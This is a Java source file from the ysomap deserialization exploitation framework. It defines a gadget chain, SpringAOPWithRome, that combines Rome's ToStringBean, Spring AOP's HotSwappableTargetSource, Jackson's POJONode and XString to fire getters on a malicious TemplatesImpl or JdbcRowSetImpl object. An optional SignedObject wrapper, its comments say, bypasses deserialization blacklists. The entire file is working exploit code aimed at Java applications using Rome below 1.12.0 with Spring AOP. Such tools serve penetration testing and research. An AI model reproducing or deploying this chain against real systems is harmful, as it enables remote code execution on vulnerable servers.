package ysomap.payloads.java.rome;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xpath.internal.objects.XString;
import org.springframework.aop.target.HotSwappableTargetSource;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.LdapAttributeBullet;
import ysomap.common.annotation.*;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;
import ysomap.payloads.AbstractPayload;
import ysomap.payloads.Payload;

import javax.xml.transform.Templates;
import java.io.Serializable;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.HashMap;
import java.util.Objects;

import static ysomap.payloads.java.jackson.SpringAOPXStringWithJackson.setValue;

/**
 * @author whocansee
 * @since 2023/10/7
 * Rome链因其特殊序列化逻辑，可以使用JdbcBullet而不能使用LDAPBullet
 * 添加了obj instanceof TemplatesImpl判断，以在使用TemplatesImplBullet的时候稳定触发Rome链
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.whocansee })
@Targets({Targets.JDK})
@Require(bullets = {"JdbcRowSetImplBullet", "TemplatesImplBullet"}, param = false)
@Dependencies({"Rome < 1.12.0 & SpringAOP"})
@Details("基本原理和BadAttributeValueExpExceptionWithJackson一致，只是将toString触发方式改成了SpringAOP依赖的一条链（最先用于Hessian反序列化）")
public class SpringAOPWithRome extends AbstractPayload<Object> {

    @Require(name = "wrapped", detail = "是否使用SignedObject进行二次反序列化（用以绕过反序列化黑名单）" +
            "默认不使用，填true表示启用")
    private Boolean wrapped = false;

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return LdapAttributeBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        Object obj1 = getterGadget(obj);
        if (wrapped) {
            KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
            kpg.initialize(1024);
            KeyPair kp = kpg.generateKeyPair();
            SignedObject signedObject = new SignedObject((Serializable) obj1, kp.getPrivate(), Signature.getInstance("DSA"));
            return PayloadHelper.makeReadObjectToStringTrigger(getterGadget(signedObject));
        } else {
            return PayloadHelper.makeReadObjectToStringTrigger(obj1);
        }
    }
    public Object getterGadget(Object obj) throws Exception {
        Object stringBean = null;
        Class<?> type = obj.getClass();
        if(obj instanceof TemplatesImpl){stringBean = makeStringBean(Templates.class, obj);}
        else{stringBean = makeStringBean(type, obj);}

        POJONode node1 = new POJONode(null);
        HotSwappableTargetSource v1 = new HotSwappableTargetSource(node1);
        HotSwappableTargetSource v2 = new HotSwappableTargetSource(new XString("x"));

        HashMap<Object,Object> hashMap = new HashMap<>();
        hashMap.put(v1,v1);
        hashMap.put(v2,v2);
        setValue(v1,"target",stringBean);
        return hashMap;
    }
    public Object makeStringBean(Class<?> type, Object obj) throws Exception {
        Object stringBean = null;
        try{
            // for rome 1.0
            stringBean = ReflectionHelper.newInstance("com.sun.syndication.feed.impl.ToStringBean", new Class[]{Class.class, Object.class}, type, obj);
        }catch (Exception e){
            // for rome 1.11.1
            stringBean = ReflectionHelper.newInstance("com.rometools.rome.feed.impl.ToStringBean", new Class[]{Class.class, Object.class}, type, obj);
        }
        return stringBean;
    }

}